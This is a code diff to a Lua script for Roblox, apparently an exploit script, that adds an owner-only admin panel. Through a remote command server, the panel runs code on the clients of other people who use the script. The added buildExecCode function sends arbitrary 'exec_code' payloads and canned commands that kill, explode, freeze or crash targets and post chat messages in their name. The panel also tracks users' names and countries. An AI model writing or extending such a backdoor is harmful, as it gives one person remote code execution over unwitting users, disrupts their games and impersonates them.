@@ -1,4 +1,3 @@
---4
 local isOwnerHwid = ...
 if not isOwnerHwid then return end
 
@@ -41,6 +40,10 @@ local MOON_HWID_ALT = "8b7f96b38ad7f5ac6ad1aac819eb61f1d54fe4987b64659b7941a8dbc
 local hwid = realHwid ~= "" and realHwid or MOON_HWID_ALT
 local function currentHwid() return hwid end
 local clientId = game.JobId .. ":" .. tostring(player.UserId)
+
+local allDropdowns = {}
+local usernameFallbackCache = {}
+local usernameFetching = {}
 
 local function getSafeGuiParent()
     local hidden
@@ -220,14 +223,11 @@ local function aCodeInput(parent, placeholder, defaultHeight, maxHeight)
         local text = box.Text or ""
         local lines = 1
         for _ in text:gmatch("\n") do lines = lines + 1 end
-        
         box.TextYAlignment = (lines > 1) and Enum.TextYAlignment.Top or Enum.TextYAlignment.Center
-        
         local lineH = 16
         local fromLines = lines * lineH + 16
         local fromBounds = box.TextBounds.Y + 16
         local needed = math.max(fromLines, fromBounds, defaultHeight - 8)
-        
         box.Size = UDim2.new(1, 0, 0, needed)
         local frameH = math.clamp(needed + 8, defaultHeight, maxHeight)
         f.Size = UDim2.new(1, 0, 0, frameH)
@@ -273,42 +273,75 @@ local function dedupePlayers(list)
 end
 
 local usersCache = { list = {}, at = 0, fetching = false }
-local USERS_TTL = 10
+local USERS_TTL = 8
+
+local function notifyDropdowns()
+    local snapshot = {}
+    for _, dd in ipairs(allDropdowns) do
+        table.insert(snapshot, dd)
+    end
+    for _, dd in ipairs(snapshot) do
+        if dd.refreshPlaceholder then pcall(dd.refreshPlaceholder) end
+    end
+end
+
+local function fetchUsersIntoCache()
+    local data = adminHttpGet(SERVER_URL .. "/all?hwid=" .. currentHwid())
+    if data and data.players then
+        usersCache.list = dedupePlayers(data.players)
+        usersCache.at = os.clock()
+    end
+end
+
+local function prefetchUsers()
+    if usersCache.at > 0 or usersCache.fetching then return end
+    usersCache.fetching = true
+    for _ = 1, 3 do
+        fetchUsersIntoCache()
+        if usersCache.at > 0 then break end
+        task.wait(0.5)
+    end
+    usersCache.fetching = false
+    notifyDropdowns()
+end
 
 local function getUsersCached()
-    local now = os.clock()
     if usersCache.at == 0 then
-        if usersCache.fetching then
-            while usersCache.fetching do task.wait(0.05) end
-            return usersCache.list
+        if not usersCache.fetching then
+            usersCache.fetching = true
+            task.spawn(function()
+                fetchUsersIntoCache()
+                usersCache.fetching = false
+                notifyDropdowns()
+            end)
         end
-        usersCache.fetching = true
-        local data = adminHttpGet(SERVER_URL .. "/all?hwid=" .. currentHwid())
-        usersCache.list = dedupePlayers((data and data.players) or {})
-        usersCache.at = os.clock()
-        usersCache.fetching = false
         return usersCache.list
     end
+    local now = os.clock()
     if now - usersCache.at >= USERS_TTL and not usersCache.fetching then
         usersCache.fetching = true
         task.spawn(function()
-            local data = adminHttpGet(SERVER_URL .. "/all?hwid=" .. currentHwid())
-            if data and data.players then
-                usersCache.list = dedupePlayers(data.players)
-                usersCache.at = os.clock()
-            end
+            fetchUsersIntoCache()
             usersCache.fetching = false
+            notifyDropdowns()
         end)
     end
     return usersCache.list
 end
 
 local function getUsersFresh()
-    local data = adminHttpGet(SERVER_URL .. "/all?hwid=" .. currentHwid())
-    if data and data.players then
-        usersCache.list = dedupePlayers(data.players)
-        usersCache.at = os.clock()
+    if usersCache.fetching then
+        local t = 0
+        while usersCache.fetching and t < 8 do
+            task.wait(0.05)
+            t = t + 0.05
+        end
+        return usersCache.list
     end
+    usersCache.fetching = true
+    fetchUsersIntoCache()
+    usersCache.fetching = false
+    notifyDropdowns()
     return usersCache.list
 end
 
@@ -346,31 +379,146 @@ local function filterUsers(query, source)
     return out
 end
 
-local function dispatchCommand(targets, cmdType, payload)
-    local body = {
-        hwid = currentHwid(), type = cmdType, payload = payload or {},
-        gameId = gameIdStr, placeId = placeIdStr,
-    }
-    if targets == nil then
-        local freshList = getUsersFresh()
-        local ids = {}
-        for _, p in ipairs(freshList) do
-            if p.id and p.id ~= clientId then
-                table.insert(ids, p.id)
-            end
-        end
-        if #ids == 0 then
-            return nil
-        end
-        body.targets = ids
-        body.all = false
-    else
-        body.targets = targets
-        body.all = false
-        if #targets == 0 then return nil end
+local function escapeLuaSingle(s)
+    s = tostring(s or "")
+    s = s:gsub("\\", "\\\\")
+    s = s:gsub("'", "\\'")
+    s = s:gsub("\r", "")
+    s = s:gsub("\n", "\\n")
+    return s
+end
+
+local function buildExecCode(cmdType, payload)
+    payload = payload or {}
+    if cmdType == "exec_code" then
+        return tostring(payload.code or "")
+    elseif cmdType == "kill" then
+        return [[
+local plr = game:GetService("Players").LocalPlayer
+if plr and plr.Character then
+    local hum = plr.Character:FindFirstChildOfClass("Humanoid")
+    if hum then hum.Health = 0 end
+end
+]]
+    elseif cmdType == "explode" then
+        return [[
+local plr = game:GetService("Players").LocalPlayer
+if plr and plr.Character then
+    local hrp = plr.Character:FindFirstChild("HumanoidRootPart")
+    if hrp then
+        local e = Instance.new("Explosion")
+        e.Position = hrp.Position
+        e.BlastRadius = 20
+        e.BlastPressure = 0
+        e.DestroyJointRadiusPercent = 0
+        e.Parent = workspace
     end
-    local res = adminHttpPost(SERVER_URL .. "/cmd", body)
-    return res
+end
+]]
+    elseif cmdType == "crash" then
+        return "while true do end"
+    elseif cmdType == "show_text" then
+        local text = escapeLuaSingle(payload.text or "")
+        return ([[
+local text = '%s'
+local sg = Instance.new("ScreenGui")
+sg.Name = "AdminCenterText"
+sg.IgnoreGuiInset = true
+sg.ResetOnSpawn = false
+local okp = pcall(function()
+    if typeof(gethui) == "function" then
+        sg.Parent = gethui()
+    else
+        sg.Parent = game:GetService("CoreGui")
+    end
+end)
+if not okp or not sg.Parent then
+    sg.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
+end
+local lbl = Instance.new("TextLabel")
+lbl.AnchorPoint = Vector2.new(0.5, 0.5)
+lbl.Position = UDim2.new(0.5, 0, 0.5, 0)
+lbl.Size = UDim2.new(0.92, 0, 0, 110)
+lbl.BackgroundTransparency = 1
+lbl.Text = text
+lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
+lbl.Font = Enum.Font.GothamBold
+lbl.TextScaled = true
+lbl.TextWrapped = true
+lbl.TextStrokeTransparency = 0
+lbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+lbl.Parent = sg
+task.delay(8, function()
+    pcall(function() if sg then sg:Destroy() end end)
+end)
+]]):format(text)
+    elseif cmdType == "chat_text" then
+        local text = escapeLuaSingle(payload.text or "")
+        return ([[
+pcall(function()
+    local TCS = game:GetService("TextChatService")
+    if TCS and TCS.TextChannels and TCS.TextChannels.RBXGeneral then
+        TCS.TextChannels.RBXGeneral:SendAsync('%s')
+    end
+end)
+]]):format(text)
+    elseif cmdType == "freeze" then
+        local state = payload.state and "true" or "false"
+        return ([[
+local plr = game:GetService("Players").LocalPlayer
+if plr and plr.Character then
+    local hrp = plr.Character:FindFirstChild("HumanoidRootPart")
+    if hrp then hrp.Anchored = %s end
+end
+]]):format(state)
+    elseif cmdType == "invis" then
+        local transp = payload.state and "1" or "0"
+        return ([[
+local plr = game:GetService("Players").LocalPlayer
+if plr and plr.Character then
+    for _, v in ipairs(plr.Character:GetDescendants()) do
+        if v:IsA("BasePart") or v:IsA("Decal") then
+            v.Transparency = %s
+        end
+    end
+end
+]]):format(transp)
+    end
+    return ""
+end
+
+local function dispatchCommand(targets, cmdType, payload)
+    local code = buildExecCode(cmdType, payload)
+    if code == "" then return end
+    if targets ~= nil and #targets == 0 then return end
+
+    task.spawn(function()
+        local body = {
+            hwid = currentHwid(), type = "exec_code",
+            payload = { code = code },
+            gameId = gameIdStr, placeId = placeIdStr,
+        }
+        if targets == nil then
+            local list = getUsersCached()
+            if #list == 0 then
+                list = getUsersFresh()
+            end
+            local ids = {}
+            for _, p in ipairs(list) do
+                local pId = p.id
+                local pUid = tonumber(p.userId)
+                if pId and pId ~= clientId and pUid ~= player.UserId then
+                    table.insert(ids, pId)
+                end
+            end
+            if #ids == 0 then return end
+            body.targets = ids
+        else
+            body.targets = targets
+        end
+        body.all = false
+        adminHttpPost(SERVER_URL .. "/cmd", body)
+    end)
 end
 
 local function hopToServer(targetPlaceId, targetJobId)
@@ -380,10 +528,6 @@ local function hopToServer(targetPlaceId, targetJobId)
     local ok = pcall(function() TeleportService:TeleportToPlaceInstance(pid, targetJobId, player) end)
     if not ok then pcall(function() TeleportService:Teleport(pid, player) end) end
 end
-
-local usernameFallbackCache = {}
-local usernameFetching = {}
-local allDropdowns = {}
 
 local function resolveUserNames(p)
     local uid = tonumber(p.userId)
@@ -405,9 +549,7 @@ local function resolveUserNames(p)
                 usernameFetching[uid] = nil
                 if ok and n then
                     usernameFallbackCache[uid] = n
-                    for _, dd in ipairs(allDropdowns) do
-                        if dd.refreshPlaceholder then pcall(dd.refreshPlaceholder) end
-                    end
+                    notifyDropdowns()
                 end
             end)
         end
@@ -456,6 +598,8 @@ local function fitText(text, maxW, textSize, font)
     return text:sub(1, lo) .. "..."
 end
 
+task.spawn(prefetchUsers)
+
 local function aDropdown(parent, placeholder, getOptions, selectionState, onSelectionChanged, prewarm)
     local prewarmCount = prewarm or 60
 
@@ -495,6 +639,16 @@ local function aDropdown(parent, placeholder, getOptions, selectionState, onSele
     }, container)
     aCorner(listHolder, 6)
     aStroke(listHolder, ADMIN_BORDER, 1, 0)
+
+    local emptyLabel = aNew("TextLabel", {
+        Name = "EmptyLabel",
+        Size = UDim2.new(1, -16, 0, 24), Position = UDim2.new(0, 10, 0, 3),
+        BackgroundTransparency = 1, Visible = false,
+        Text = "", TextColor3 = Color3.fromRGB(160, 120, 140),
+        TextSize = 11, Font = Enum.Font.Gotham,
+        TextXAlignment = Enum.TextXAlignment.Left,
+        ZIndex = 22,
+    }, listHolder)
 
     local scroll = aNew("ScrollingFrame", {
         Size = UDim2.new(1, -6, 1, -6), Position = UDim2.new(0, 3, 0, 3),
@@ -604,6 +758,7 @@ local function aDropdown(parent, placeholder, getOptions, selectionState, onSele
         query = query or ""
         local allOpts = getOptions(query) or {}
         local shown = #allOpts
+        local isLoading = (shown == 0 and usersCache.fetching)
 
         self.renderToken = self.renderToken + 1
         local myToken = self.renderToken
@@ -622,11 +777,27 @@ local function aDropdown(parent, placeholder, getOptions, selectionState, onSele
         local totalH = math.min(contentH, maxContentH) + 6
         scroll.ScrollBarThickness = (contentH > maxContentH) and 4 or 0
 
-        listHolder.Visible = (shown > 0)
+        if shown == 0 then
+            emptyLabel.Visible = true
+            if isLoading then
+                emptyLabel.Text = "Loading users..."
+            elseif query ~= "" then
+                emptyLabel.Text = "No matches"
+            else
+                emptyLabel.Text = "No users"
+            end
+            totalH = 30
+            scroll.Visible = false
+        else
+            emptyLabel.Visible = false
+            scroll.Visible = true
+        end
+
+        listHolder.Visible = true
         if isOpening then
             listHolder.Size = UDim2.new(1, 0, 0, 0)
-            TweenService:Create(listHolder, TweenInfo.new(0.2, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), { Size = UDim2.new(1, 0, 0, totalH) }):Play()
-            TweenService:Create(arrow, TweenInfo.new(0.2), { Rotation = 180 }):Play()
+            TweenService:Create(listHolder, TweenInfo.new(0.18, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), { Size = UDim2.new(1, 0, 0, totalH) }):Play()
+            TweenService:Create(arrow, TweenInfo.new(0.18), { Rotation = 180 }):Play()
         else
             listHolder.Size = UDim2.new(1, 0, 0, totalH)
         end
@@ -677,10 +848,10 @@ local function aDropdown(parent, placeholder, getOptions, selectionState, onSele
         suppressTextHandler = true
         if box.Text ~= "" then box.Text = "" end
         suppressTextHandler = false
-        local tw = TweenService:Create(listHolder, TweenInfo.new(0.2, Enum.EasingStyle.Quart, Enum.EasingDirection.In), { Size = UDim2.new(1, 0, 0, 0) })
+        local tw = TweenService:Create(listHolder, TweenInfo.new(0.18, Enum.EasingStyle.Quart, Enum.EasingDirection.In), { Size = UDim2.new(1, 0, 0, 0) })
         tw.Completed:Connect(function() listHolder.Visible = false end)
         tw:Play()
-        TweenService:Create(arrow, TweenInfo.new(0.2), { Rotation = 0 }):Play()
+        TweenService:Create(arrow, TweenInfo.new(0.18), { Rotation = 0 }):Play()
     end
 
     function self.doOpen()
@@ -700,7 +871,7 @@ local function aDropdown(parent, placeholder, getOptions, selectionState, onSele
 
     local function toggleSelf()
         local now = os.clock()
-        if now - lastToggleTime < 0.2 then return end
+        if now - lastToggleTime < 0.18 then return end
         lastToggleTime = now
         if self.isOpen then self.doClose() else self.doOpen() end
     end
@@ -823,6 +994,10 @@ function buildAdminPanel()
     local old = guiParent:FindFirstChild("MoondietyAdminPanel")
     if old then old:Destroy() end
     allDropdowns = {}
+
+    if usersCache.at == 0 and not usersCache.fetching then
+        task.spawn(prefetchUsers)
+    end
 
     local sg = aNew("ScreenGui", {
         Name = "MoondietyAdminPanel", ResetOnSpawn = false,
@@ -962,6 +1137,18 @@ function buildAdminPanel()
         return ids
     end
 
+    local function getFirstSelectedUserId()
+        for _, p in pairs(serverSel) do
+            local u = tonumber(p.userId)
+            if u then return u end
+        end
+        for _, p in pairs(allSel) do
+            local u = tonumber(p.userId)
+            if u then return u end
+        end
+        return nil
+    end
+
     local userPanel = aNew("Frame", { Size = UDim2.new(1, 0, 1, 0), BackgroundTransparency = 1, Visible = false }, content)
     tabs["User Panel"] = userPanel
 
@@ -1056,9 +1243,24 @@ function buildAdminPanel()
     invisToggle.Position = UDim2.new(0, 0, 0, 66)
 
     local spectateToggle = aToggleButton(rightCol, "Spectate", UDim2.new(1, 0, 0, 30), function(state)
-        local ids = getAllSelectedIds()
-        if #ids == 0 then return end
-        dispatchCommand(ids, "spectate", { state = state })
+        if state then
+            local targetUid = getFirstSelectedUserId()
+            if not targetUid then return end
+            local target = Players:GetPlayerByUserId(targetUid)
+            if target and target.Character then
+                local hum = target.Character:FindFirstChildOfClass("Humanoid")
+                if hum then
+                    workspace.CurrentCamera.CameraSubject = hum
+                end
+            end
+        else
+            if player.Character then
+                local myHum = player.Character:FindFirstChildOfClass("Humanoid")
+                if myHum then
+                    workspace.CurrentCamera.CameraSubject = myHum
+                end
+            end
+        end
     end)
     spectateToggle.Position = UDim2.new(0, 0, 0, 102)
 
@@ -1136,6 +1338,26 @@ function buildAdminPanel()
 
     local currentButtons = {}
 
+    local function buildServerLabel(playersList)
+        if typeof(playersList) ~= "table" or #playersList == 0 then
+            return "(no users)"
+        end
+        local parts = {}
+        for _, p in ipairs(playersList) do
+            local uname = p.username or p.user_name or p.name or "?"
+            local dname = p.displayName or p.display_name or p.name or uname
+            local country = p.country or p.countryCode or p.region or p.location or "?"
+            local entry
+            if dname ~= "" and dname ~= uname then
+                entry = uname .. " (" .. dname .. ") | " .. country
+            else
+                entry = uname .. " | " .. country
+            end
+            table.insert(parts, entry)
+        end
+        return table.concat(parts, "  ,  ")
+    end
+
     local function refreshServers()
         if not sg.Parent then return end
         local data = fetchServers(gameIdStr)
@@ -1144,33 +1366,21 @@ function buildAdminPanel()
         local seen = {}
 
         for _, s in ipairs(servers) do
-            local key = tostring(s.jobId or s.id or math.random())
+            local pJobId = s.jobId or s.job_id or s.id or ""
+            local pPlaceId = s.placeId or s.place_id or placeIdStr
+            local key = tostring(pJobId ~= "" and pJobId or (pPlaceId .. ":" .. tostring(math.random())))
             seen[key] = true
 
-            local pName = s.username or s.name or s.playerName or s.displayName or "?"
-            local pDisp = s.displayName or s.display_name or s.username or s.name or "?"
-            local sUsers = s.scriptUsers or s.scriptCount or s.count or s.users or s.userCount or "0"
-            local pCountry = s.country or s.countryCode or s.region or s.location or "?"
-            local pPlaceId = s.placeId or s.place_id or placeIdStr
-            local pJobId = s.jobId or s.job_id or s.id or ""
-
-            local sPlayers = s.players
-            if typeof(sPlayers) == "table" then sPlayers = #sPlayers end
-            sPlayers = tostring(sPlayers or s.playerCount or s.player_count or "0")
-
-            local sMax = s.maxPlayers
-            if typeof(sMax) == "table" then sMax = #sMax end
-            sMax = tostring(sMax or s.max_players or s.maxPlayerCount or "0")
-
-            local txt = tostring(pName) .. " (" .. tostring(pDisp) .. ") | " .. tostring(sUsers) .. " | " .. tostring(pCountry) .. " | " .. sPlayers .. "/" .. sMax
+            local txt = buildServerLabel(s.players)
             local btn = currentButtons[key]
 
             if btn and btn.Parent then
                 btn.Text = txt
                 btn.Position = UDim2.new(0, 4, 0, y)
             else
+                local capPlace, capJob = pPlaceId, pJobId
                 btn = aButton(servList, txt, UDim2.new(1, -8, 0, 34), ADMIN_GRAY, function()
-                    hopToServer(pPlaceId, pJobId)
+                    hopToServer(capPlace, capJob)
                 end)
                 btn.Position = UDim2.new(0, 4, 0, y)
                 btn.TextSize = 11
@@ -1209,10 +1419,6 @@ function buildAdminPanel()
                 pcall(refreshServers)
             end
         end
-    end)
-
-    task.spawn(function()
-        pcall(getUsersCached)
     end)
 
     setActiveTab("User Panel")
